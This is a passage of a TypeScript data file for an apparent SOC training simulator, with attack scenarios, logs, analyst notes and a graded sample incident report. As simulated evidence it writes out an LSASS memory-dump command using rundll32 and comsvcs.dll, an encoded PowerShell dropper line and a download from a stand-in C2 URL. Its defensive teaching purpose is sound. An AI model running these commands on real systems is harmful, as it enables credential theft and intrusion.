        description: 'EDR triggers ALERT ALT-2026-8812: winword.exe spawned powershell.exe with -w hidden -enc flags.',
        analyst_action: 'Open Alert ALT-2026-8812 in Investigation Studio. Inspect the parent-child process tree and Base64 payload.',
        expected_findings: 'Child process is downloading stage2 payload from external C2 domain update-cdn-cloudsvc.com.'
      },
      {
        step_number: 2,
        phase: 'IOC Analysis & Threat Intel',
        description: 'Pivot into IOC Investigation tool with SHA-256 hash 9b71d224bd... and domain update-cdn-cloudsvc.com.',
        analyst_action: 'Examine file reputation (100/100 risk score) and C2 domain infrastructure.',
        expected_findings: 'High confidence Cobalt Strike 4.9 beacon infrastructure. Multiple endpoints potentially vulnerable.'
      },
      {
        step_number: 3,
        phase: 'Containment Action',
        description: 'Execute EDR isolation on WIN-CLIENT-08 to stop active C2 beaconing and prevent lateral movement.',
        analyst_action: 'Click "Isolate Endpoint" and "Block Source IP" buttons in the Investigation Studio.',
        expected_findings: 'Endpoint isolated from network; perimeter firewall blocks 185.220.101.44.'
      },
      {
        step_number: 4,
        phase: 'Remediation & SANS Report',
        description: 'Generate comprehensive Incident Report detailing attack path and recommending Office ASR rule deployment.',
        analyst_action: 'Navigate to Report Studio, generate report, and submit for auto-evaluator scoring.',
        expected_findings: 'Complete NIST report with full IOC table and 5-Whys root cause analysis.'
      }
    ],
    injected_events: [
      INITIAL_EVENTS[0], // EVT-9041 PowerShell
      INITIAL_EVENTS[1], // EVT-9040 C2 Beacon
      INITIAL_EVENTS[2]  // EVT-9039 LSASS Dump
    ],
    injected_alert: INITIAL_ALERTS[0],
    injected_incident: INITIAL_INCIDENTS[0]
  },
  {
    id: 'SCENARIO-03',
    key: 'mimikatz_lsass_dump',
    title: 'Scenario 3: LSASS Process Memory Dumping & Credential Theft',
    severity: 'CRITICAL',
    category: 'Credential Access / In-Memory Forensics',
    description: 'An in-memory threat process executes rundll32 with comsvcs.dll MiniDump parameters against lsass.exe to steal plaintext passwords and Kerberos tickets from memory.',
    target_asset: 'WIN-CLIENT-08 (192.168.10.45)',
    attacker_ip: '192.168.10.45 (Local Endpoint)',
    compromised_user: 'SYSTEM / jdoe',
    mitre_chain: [
      { tactic: 'Credential Access', technique: 'OS Credential Dumping: LSASS Memory', technique_id: 'T1003.001' },
      { tactic: 'Defense Evasion', technique: 'Subvert Trust Controls: Install Root Certificate', technique_id: 'T1553' }
    ],
    scenario_flow_steps: [
      {
        step_number: 1,
        phase: 'Sysmon Alert Detection',
        description: 'Sysmon EID 10 detects unauthorized PROCESS_VM_READ access right against lsass.exe.',
        analyst_action: 'Locate EVT-9039 in Event Stream. Inspect command line: rundll32.exe comsvcs.dll, MiniDump.',
        expected_findings: 'Memory dump file created at C:\\Users\\jdoe\\AppData\\Local\\Temp\\lsass.dmp.'
      },
      {
        step_number: 2,
        phase: 'Credential Revocation',
        description: 'Assume all local and domain credentials cached in LSASS are compromised.',
        analyst_action: 'Force enterprise password reset for jdoe and krbtgt account. Enable Credential Guard.',
        expected_findings: 'Cached credentials invalidated.'
      }
    ],
    injected_events: [INITIAL_EVENTS[2]],
    injected_alert: INITIAL_ALERTS[0],
    injected_incident: INITIAL_INCIDENTS[0]
  },
  {
    id: 'SCENARIO-04',
    key: 'port_scan_recon',
    title: 'Scenario 4: External SYN Port Scan & Web Reconnaissance',
    severity: 'MEDIUM',
    category: 'Network Reconnaissance',
    description: 'An external threat actor conducts an aggressive Nmap SYN port sweep across 850 ports on the corporate perimeter web server WEB-SRV-01.',
    target_asset: 'WEB-SRV-01 (10.0.0.10)',
    attacker_ip: '45.142.214.99 (Russia)',
    compromised_user: 'N/A',
    mitre_chain: [
      { tactic: 'Reconnaissance', technique: 'Active Scanning: Scanning IP Blocks', technique_id: 'T1595.001' },
      { tactic: 'Discovery', technique: 'Network Service Scanning', technique_id: 'T1046' }
    ],
    scenario_flow_steps: [
      {
        step_number: 1,
        phase: 'Network Flow Analysis',
        description: 'Perimeter firewall logs show 850 TCP SYN packets in 10 seconds without completing handshake.',
        analyst_action: 'Navigate to Network Security module. Review source IP 45.142.214.99 flow telemetry.',
        expected_findings: 'Probing ports 21, 22, 80, 443, 3389, 8080. Dropped by firewall ACL.'
      },
      {
        step_number: 2,
        phase: 'Automated IP Blacklist',
        description: 'Enforce perimeter edge firewall block rule for IP 45.142.214.99.',
        analyst_action: 'Add IP to firewall drop list in IOC module.',
        expected_findings: 'Traffic blocked at edge router.'
      }
    ],
    injected_events: [INITIAL_EVENTS[6]],
    injected_alert: INITIAL_ALERTS[4],
    injected_incident: INITIAL_INCIDENTS[0]
  },
  {
    id: 'SCENARIO-05',
    key: 'dns_tunneling_exfil',
    title: 'Scenario 5: Covert Data Exfiltration via DNS Tunneling',
    severity: 'HIGH',
    category: 'Data Exfiltration / Covert Channel',
    description: 'Attacker leverages an SQL injection vulnerability on internal reporting database to execute xp_cmdshell, chunking payroll records into Base64 TXT DNS queries to c2-exfil-ns1.darknet.io.',
    target_asset: 'DB-SRV-01 (192.168.10.88)',
    attacker_ip: 'External NS: c2-exfil-ns1.darknet.io',
    compromised_user: 'svc_backup (Database Service Account)',
    mitre_chain: [
      { tactic: 'Initial Access', technique: 'Exploit Public-Facing App: SQL Injection', technique_id: 'T1190' },
      { tactic: 'Execution', technique: 'Command and Scripting: Command Interpreter', technique_id: 'T1059' },
      { tactic: 'Exfiltration', technique: 'Exfiltration Over C2 Channel: DNS Tunneling', technique_id: 'T1071.004' }
    ],
    scenario_flow_steps: [
      {
        step_number: 1,
        phase: 'DNS Telemetry Analysis',
        description: 'SIEM detects over 2,400 TXT record lookups with Shannon entropy > 4.8 originating from DB-SRV-01.',
        analyst_action: 'Search DNS logs for domain "darknet.io". Inspect query patterns and decoded base64 strings.',
        expected_findings: 'Queries decode to database table names and employee payroll numbers.'
      },
      {
        step_number: 2,
        phase: 'Sinkholing & Database Hardening',
        description: 'Sinkhole domain at internal DNS resolvers and disable xp_cmdshell on database.',
        analyst_action: 'Advance INC-2026-0043 to CONTAINED status.',
        expected_findings: 'Covert channel severed. SQL injection endpoint patched.'
      }
    ],
    injected_events: [INITIAL_EVENTS[7]],
    injected_alert: INITIAL_ALERTS[2],
    injected_incident: INITIAL_INCIDENTS[2]
  },
  {
    id: 'SCENARIO-06',
    key: 'impossible_travel_takeover',
    title: 'Scenario 6: Cloud Account Takeover & Impossible Travel',
    severity: 'HIGH',
    category: 'Identity & Cloud Account Takeover',
    description: 'An executive account is accessed from New York and Moscow within a 15-minute window, followed by creation of malicious email forwarding rules in Office 365.',
    target_asset: 'AZURE-AD-AUTH / Office 365 Cloud',
    attacker_ip: '91.240.118.82 (Moscow, Russia)',
    compromised_user: 'sarah.connor@corp.cyber',
    mitre_chain: [
      { tactic: 'Initial Access', technique: 'Valid Accounts: Cloud Accounts', technique_id: 'T1078.004' },
      { tactic: 'Persistence', technique: 'Account Manipulation: Email Forwarding Rules', technique_id: 'T1098.002' }
    ],
    scenario_flow_steps: [
      {
        step_number: 1,
        phase: 'Identity Anomaly Review',
        description: 'Azure AD Identity Protection flags high-risk sign-in from 91.240.118.82 with velocity > 18,000 km/h.',
        analyst_action: 'Navigate to Authentication Monitoring page. Filter for sarah.connor@corp.cyber.',
        expected_findings: 'First login from US IP, second login from Russian proxy IP.'
      },
      {
        step_number: 2,
        phase: 'Session Revocation & MFA Enforcement',
        description: 'Revoke active refresh tokens and verify out-of-band with user.',
        analyst_action: 'Click "Revoke Credentials" and confirm MFA step-up.',
        expected_findings: 'Attacker session disconnected.'
      }
    ],
    injected_events: [INITIAL_EVENTS[5]],
    injected_alert: INITIAL_ALERTS[3],
    injected_incident: INITIAL_INCIDENTS[0]
  }
];

// ==========================================
// 9. NETWORK FLOWS (25 REALISTIC RECORDS)
// ==========================================
export const INITIAL_NETWORK_FLOWS: NetworkFlow[] = [
  { id: 'FLOW-101', timestamp: '2026-08-26 19:50:12', source_ip: '192.168.10.45', dest_ip: '185.220.101.44', source_port: 49812, dest_port: 443, protocol: 'HTTPS', bytes: 1420, packets: 18, action: 'ALERT', country: 'NL', risk_score: 95, anomaly_flag: 'Cobalt Strike TLS Beacon' },
  { id: 'FLOW-102', timestamp: '2026-08-26 19:49:45', source_ip: '192.168.10.45', dest_ip: '185.220.101.44', source_port: 49812, dest_port: 443, protocol: 'HTTPS', bytes: 890, packets: 12, action: 'ALERT', country: 'NL', risk_score: 95, anomaly_flag: 'Periodic Heartbeat (60s Jitter)' },
  { id: 'FLOW-103', timestamp: '2026-08-26 19:46:58', source_ip: '203.0.113.195', dest_ip: '10.0.0.15', source_port: 54180, dest_port: 22, protocol: 'SSH', bytes: 4890, packets: 54, action: 'ALERT', country: 'HK', risk_score: 92, anomaly_flag: 'Brute Force Success Flow' },
  { id: 'FLOW-104', timestamp: '2026-08-26 19:46:10', source_ip: '203.0.113.195', dest_ip: '10.0.0.15', source_port: 54122, dest_port: 22, protocol: 'SSH', bytes: 1280, packets: 24, action: 'DROP', country: 'HK', risk_score: 90, anomaly_flag: 'SSH Auth Failure Burst' },
  { id: 'FLOW-105', timestamp: '2026-08-26 19:43:22', source_ip: '45.142.214.99', dest_ip: '10.0.0.10', source_port: 39481, dest_port: 80, protocol: 'TCP', bytes: 64, packets: 1, action: 'ALERT', country: 'RU', risk_score: 65, anomaly_flag: 'SYN Scan Probe' },
  { id: 'FLOW-106', timestamp: '2026-08-26 19:43:22', source_ip: '45.142.214.99', dest_ip: '10.0.0.10', source_port: 39482, dest_port: 443, protocol: 'TCP', bytes: 64, packets: 1, action: 'ALERT', country: 'RU', risk_score: 65, anomaly_flag: 'SYN Scan Probe' },
  { id: 'FLOW-107', timestamp: '2026-08-26 19:43:22', source_ip: '45.142.214.99', dest_ip: '10.0.0.10', source_port: 39483, dest_port: 3389, protocol: 'TCP', bytes: 64, packets: 1, action: 'DROP', country: 'RU', risk_score: 75, anomaly_flag: 'RDP Port Probe' },
  { id: 'FLOW-108', timestamp: '2026-08-26 19:41:05', source_ip: '192.168.10.88', dest_ip: '192.168.10.1', source_port: 58211, dest_port: 53, protocol: 'DNS', bytes: 84000, packets: 2400, action: 'ALERT', country: 'LOCAL', risk_score: 88, anomaly_flag: 'High Entropy TXT Lookups' },
  { id: 'FLOW-109', timestamp: '2026-08-26 19:38:10', source_ip: '192.168.10.22', dest_ip: '10.0.0.1', source_port: 52140, dest_port: 88, protocol: 'TCP', bytes: 3200, packets: 14, action: 'ALLOW', country: 'LOCAL', risk_score: 40, anomaly_flag: 'Kerberos TGS Request' },
  { id: 'FLOW-110', timestamp: '2026-08-26 19:35:00', source_ip: '192.168.10.105', dest_ip: '142.250.190.46', source_port: 51230, dest_port: 443, protocol: 'HTTPS', bytes: 48920, packets: 65, action: 'ALLOW', country: 'US', risk_score: 5 },
  { id: 'FLOW-111', timestamp: '2026-08-26 19:30:10', source_ip: '64.120.88.12', dest_ip: '10.0.0.50', source_port: 44320, dest_port: 443, protocol: 'HTTPS', bytes: 6400, packets: 30, action: 'ALLOW', country: 'US', risk_score: 10, anomaly_flag: 'Legitimate HQ Login' },
  { id: 'FLOW-112', timestamp: '2026-08-26 19:45:00', source_ip: '91.240.118.82', dest_ip: '10.0.0.50', source_port: 51820, dest_port: 443, protocol: 'HTTPS', bytes: 7200, packets: 34, action: 'ALERT', country: 'RU', risk_score: 84, anomaly_flag: 'Impossible Travel IP' },
  { id: 'FLOW-113', timestamp: '2026-08-26 19:28:44', source_ip: '10.0.0.10', dest_ip: '20.190.159.23', source_port: 53110, dest_port: 443, protocol: 'HTTPS', bytes: 12400, packets: 42, action: 'ALLOW', country: 'US', risk_score: 5, anomaly_flag: 'Microsoft Update Sync' },
  { id: 'FLOW-114', timestamp: '2026-08-26 19:25:00', source_ip: '192.168.10.12', dest_ip: '10.0.0.1', source_port: 49152, dest_port: 445, protocol: 'TCP', bytes: 15400, packets: 80, action: 'ALLOW', country: 'LOCAL', risk_score: 5, anomaly_flag: 'SMB File Share Sync' },
  { id: 'FLOW-115', timestamp: '2026-08-26 19:20:15', source_ip: '192.168.10.19', dest_ip: '8.8.8.8', source_port: 54100, dest_port: 53, protocol: 'DNS', bytes: 320, packets: 4, action: 'ALLOW', country: 'US', risk_score: 5 }
];

// ==========================================
// 10. AUTHENTICATION MONITORING RECORDS
// ==========================================
export const INITIAL_AUTH_LOGS: AuthRecord[] = [
  { id: 'AUTH-201', timestamp: '2026-08-26 19:46:58', username: 'deploy', source_ip: '203.0.113.195', dest_host: 'LINUX-SRV-02', auth_status: 'SUCCESS', auth_type: 'SSH', location: 'Hong Kong (HK)', is_anomaly: true, anomaly_description: 'Success immediately following 24 failures (Brute Force Success)' },
  { id: 'AUTH-202', timestamp: '2026-08-26 19:46:40', username: 'deploy', source_ip: '203.0.113.195', dest_host: 'LINUX-SRV-02', auth_status: 'FAILURE', auth_type: 'SSH', failure_reason: 'Invalid password', location: 'Hong Kong (HK)', is_anomaly: true, anomaly_description: 'Brute Force attempt' },
  { id: 'AUTH-203', timestamp: '2026-08-26 19:46:32', username: 'ubuntu', source_ip: '203.0.113.195', dest_host: 'LINUX-SRV-02', auth_status: 'FAILURE', auth_type: 'SSH', failure_reason: 'User not found', location: 'Hong Kong (HK)', is_anomaly: true, anomaly_description: 'Username harvesting' },
  { id: 'AUTH-204', timestamp: '2026-08-26 19:46:25', username: 'admin', source_ip: '203.0.113.195', dest_host: 'LINUX-SRV-02', auth_status: 'FAILURE', auth_type: 'SSH', failure_reason: 'Invalid password', location: 'Hong Kong (HK)', is_anomaly: true, anomaly_description: 'Brute Force attempt' },
  { id: 'AUTH-205', timestamp: '2026-08-26 19:46:10', username: 'root', source_ip: '203.0.113.195', dest_host: 'LINUX-SRV-02', auth_status: 'FAILURE', auth_type: 'SSH', failure_reason: 'Root login denied via password', location: 'Hong Kong (HK)', is_anomaly: true, anomaly_description: 'Root brute force' },
  { id: 'AUTH-206', timestamp: '2026-08-26 19:45:00', username: 'sarah.connor@corp.cyber', source_ip: '91.240.118.82', dest_host: 'AZURE-AD-AUTH', auth_status: 'SUCCESS', auth_type: 'WEB_PORTAL', location: 'Moscow, Russia (RU)', is_anomaly: true, anomaly_description: 'Impossible Travel: 18,400 km/h velocity delta from NY' },
  { id: 'AUTH-207', timestamp: '2026-08-26 19:30:10', username: 'sarah.connor@corp.cyber', source_ip: '64.120.88.12', dest_host: 'AZURE-AD-AUTH', auth_status: 'SUCCESS', auth_type: 'WEB_PORTAL', location: 'New York, USA (US)', is_anomaly: false },
  { id: 'AUTH-208', timestamp: '2026-08-26 19:39:18', username: 'deploy', source_ip: '10.0.0.15', dest_host: 'LINUX-SRV-02', auth_status: 'PRIV_ESC', auth_type: 'SUDO', location: 'Internal Subnet', is_anomaly: true, anomaly_description: 'Executed sudo /bin/bash via modified sudoers' },
  { id: 'AUTH-209', timestamp: '2026-08-26 19:35:40', username: 'SYSTEM', source_ip: '192.168.10.45', dest_host: 'WIN-CLIENT-08', auth_status: 'PRIV_ESC', auth_type: 'NTLM', location: 'Internal Workstation', is_anomaly: true, anomaly_description: 'Added user backdoor_admin to Administrators group' },
  { id: 'AUTH-210', timestamp: '2026-08-26 19:32:15', username: 'mark.watney', source_ip: '192.168.10.22', dest_host: 'DC-PROD-01', auth_status: 'SUCCESS', auth_type: 'KERBEROS', location: 'HQ Workstation', is_anomaly: true, anomaly_description: 'Kerberoasting SPN ticket request with RC4 encryption' },
  { id: 'AUTH-211', timestamp: '2026-08-26 19:25:00', username: 'alice.w', source_ip: '192.168.10.105', dest_host: 'DC-PROD-01', auth_status: 'SUCCESS', auth_type: 'KERBEROS', location: 'HQ Workstation', is_anomaly: false },
  { id: 'AUTH-212', timestamp: '2026-08-26 19:20:00', username: 'bob.m', source_ip: '192.168.10.108', dest_host: 'DC-PROD-01', auth_status: 'SUCCESS', auth_type: 'KERBEROS', location: 'HQ Workstation', is_anomaly: false }
];

// ==========================================
// 11. INITIAL ANALYST NOTES REPOSITORY
// ==========================================
export const INITIAL_ANALYST_NOTES: AnalystNote[] = [
  {
    id: 'NOTE-001',
    timestamp: '2026-08-26 19:51:30 UTC',
    title: 'Initial Triage: ALT-2026-8812 (PowerShell Dropper)',
    category: 'OBSERVATION',
    content: `Analyzed parent-child process telemetry for workstation WIN-CLIENT-08.
- Parent: winword.exe (Office 2016)
- Child: powershell.exe with -w hidden -enc flags
- Decoded string reveals WebClient.DownloadFile to https://update-cdn-cloudsvc.com/stage2.bin
- EDR network containment applied immediately at 19:51 UTC.
- Status: True Positive. High severity malware incident.`,
    related_entity_id: 'ALT-2026-8812',
    author: 'SOC L1 Analyst'
  },
  {
    id: 'NOTE-002',
    timestamp: '2026-08-26 19:48:15 UTC',
    title: 'Forensic Finding: SSH Brute Force on LINUX-SRV-02',
    category: 'EVIDENCE',
    content: `Attacker IP 203.0.113.195 launched 24 dictionary attempts in under a minute before hitting valid credentials for 'deploy'.
Immediately executed 'sudo /bin/bash' via custom /etc/sudoers.d/ backdoor.
Actions taken:
1. Blocked IP 203.0.113.195 at perimeter gateway.
2. Cleaned /etc/sudoers.d/99-deploy.
3. Locked user account 'deploy' pending password rotation.`,
    related_entity_id: 'INC-2026-0042',
    author: 'SOC L1 Analyst'
  }
];

// ==========================================
// 12. SAMPLE DEFAULT 13-SECTION SANS REPORT
// ==========================================
export const DEFAULT_REPORT_SAMPLE: SOCReport13Section = {
  report_title: 'SOC Incident Investigation Report: Phishing-Initiated Cobalt Strike C2 & Credential Dumping',
  prepared_by: 'SOC L1 Analyst',
  date_of_incident: '2026-08-26',
  date_of_report: '2026-08-26',
  classification: 'CONFIDENTIAL',
  incident_id: 'INC-2026-0041',

  sec1_executive_summary: 'On August 26, 2026 at 19:50 UTC, the Security Operations Center (SOC) detected and contained a critical cybersecurity incident involving workstation WIN-CLIENT-08 (user John Doe, Finance Department). A spear-phishing email delivering a weaponized Word document bypassed initial email filters. Upon macro execution, the document spawned an obfuscated PowerShell dropper which downloaded secondary shellcode from an external C2 server and attempted to dump LSASS process memory. The affected host was isolated within 60 seconds of alert triage, completely severing C2 communications and preventing lateral movement into corporate Active Directory domain controllers.',

  sec2_detection_mechanism: 'The incident was detected by Wazuh EDR & Microsoft Sysmon Event ID 1 (Process Creation). Rule "RULE-002: Obfuscated PowerShell Command" triggered when winword.exe spawned powershell.exe with command-line arguments "-nop -w hidden -enc". Suricata IDS concurrently flagged outbound TLS traffic to IP 185.220.101.44 matching Cobalt Strike beaconing profile signature 2028912.',

  sec3_chronological_timeline: `1. 19:35:10 UTC - Phishing email with attachment "Q3_Bonus_Summary.docm" delivered from payroll-update@secure-hr-portal.com.
2. 19:40:02 UTC - User opened document in Microsoft Word and enabled VBA macro.
3. 19:50:12 UTC - winword.exe spawned hidden PowerShell dropper; ALERT ALT-2026-8812 triggered in SIEM.
4. 19:51:00 UTC - SOC L1 Analyst acknowledged alert and initiated investigation.
5. 19:52:15 UTC - Attacker attempted LSASS credential minidump via rundll32.exe comsvcs.dll.
6. 19:53:00 UTC - EDR network quarantine executed on WIN-CLIENT-08.
7. 19:54:00 UTC - Firewall rule blocking IP 185.220.101.44 deployed.
8. 19:55:00 UTC - User jdoe account suspended; session tokens revoked.`,

  sec4_technical_evidence: `Command Line:
powershell.exe -nop -w hidden -enc JABzAD0ATgBlAHcALQBPAGIAagBlAGMAdAAgAE4AZQB0AC4AVwBlAGIAQwBsAGkAZQBuAHQA...
Parent Process: C:\\Program Files\\Microsoft Office\\Office16\\winword.exe (PID: 7120)
Child Process: powershell.exe (PID: 8944)
Dumping Process: rundll32.exe C:\\Windows\\System32\\comsvcs.dll, MiniDump 672 C:\\Users\\jdoe\\AppData\\Local\\Temp\\lsass.dmp full
Network Connection: 192.168.10.45:49812 -> 185.220.101.44:443 (TCP/TLS 1.3)`,

  sec5_extracted_iocs: `1. Malicious C2 IP: 185.220.101.44 (AS49453, Netherlands)
2. Malicious Domain: update-cdn-cloudsvc.com
3. Payload URL: https://update-cdn-cloudsvc.com/stage2.bin
4. SHA-256 Hash (Dropper): 9b71d224bd62f3785d96d46ad3ea3d733107e8d58ae477366bfd169d9f58f407
5. Sender Email: payroll-update@secure-hr-portal.com`,

  sec6_mitre_mapping: `• T1566.001 - Phishing: Spearphishing Attachment (Initial Access)
• T1059.001 - Command and Scripting Interpreter: PowerShell (Execution)
• T1027 - Obfuscated Files or Information: Base64 Encoding (Defense Evasion)
• T1003.001 - OS Credential Dumping: LSASS Memory (Credential Access)
• T1071.001 - Application Layer Protocol: Web Protocols / HTTPS C2 (Command & Control)`,

  sec7_impact_assessment: 'Scope was constrained to a single endpoint (WIN-CLIENT-08). Finance department network shares were audited; no file modifications or unauthorized exfiltration of proprietary records occurred. Domain controllers and database servers remained unaffected. Business impact: Negligible operational disruption due to sub-3-minute containment.',

  sec8_root_cause_analysis: 'Root Cause 5-Whys Analysis:\n1. Why did the endpoint get infected? User opened an attachment containing malicious VBA macros.\n2. Why was the macro able to execute? Microsoft Word was configured to allow user-enabled macros on unsigned documents.\n3. Why did Word spawn PowerShell? No Attack Surface Reduction (ASR) rules were enforced on the endpoint.\n4. Why was the C2 IP reachable? External firewall allowed all outbound port 443 traffic without domain reputation inspection.\n5. Fundamental Root Cause: Absence of baseline endpoint application hardening (ASR rules) and macro execution restrictions for corporate endpoints.',

  sec9_containment_actions: `1. Isolated host WIN-CLIENT-08 from local subnet via EDR software agent.
2. Injected perimeter drop rule for external IP 185.220.101.44 and domain update-cdn-cloudsvc.com.
3. Terminated processes PID 8944 (powershell.exe) and PID 9102 (rundll32.exe).
4. Disabled user jdoe Active Directory account and revoked Microsoft 365 OAuth session tokens.`,

  sec10_eradication_steps: `1. Deleted malicious document Q3_Bonus_Summary.docm from Outlook cache and %TEMP% directory.
2. Removed memory dump artifact C:\\Users\\jdoe\\AppData\\Local\\Temp\\lsass.dmp.
3. Scanned complete filesystem of WIN-CLIENT-08 using full offline antivirus definitions; confirmed zero persistent registry run keys or scheduled tasks.`,

  sec11_recovery_verification: `1. Re-imaged WIN-CLIENT-08 using baseline golden Windows 11 enterprise image.
2. Re-enrolled endpoint into EDR monitoring with enhanced Sysmon telemetry.
3. Reset user John Doe password with mandatory hardware MFA token requirement.
4. Restored network connectivity and monitored host telemetry for 4 hours with 0 anomaly detections.`,

  sec12_lessons_learned_detections: `1. Deploy Group Policy to completely disable Office VBA macros across all standard corporate endpoints.
2. Enable Windows Defender ASR Rule: "Block Office applications from creating child processes" (GUID: d4f940ab-401b-4efc-aadc-ad5f3c50688a).
3. Enable LSA Protection (RunAsPPL=1) and Credential Guard to prevent memory dumping of lsass.exe.
4. Conduct targeted spear-phishing awareness training for Finance and HR personnel.`,

  sec13_analyst_signoff: 'Investigation completed by SOC Level 1 Analyst. Verified and approved for case closure by SOC Lead & Incident Commander. Status: RESOLVED / CLOSED.',

  score_completeness: 5.0,
  score_technical_accuracy: 5.0,
  score_evidence_quality: 5.0,
  score_root_cause_depth: 5.0,
  score_remediation_actionability: 5.0,
  total_rubric_score: 5.0,
  evaluator_feedback: 'Outstanding comprehensive investigation report. Exhibits rigorous NIST SP 800-61 standards, deep forensics evidence, precise MITRE technique mapping, structured 5-Whys root cause analysis, and actionable enterprise hardening recommendations.'
};
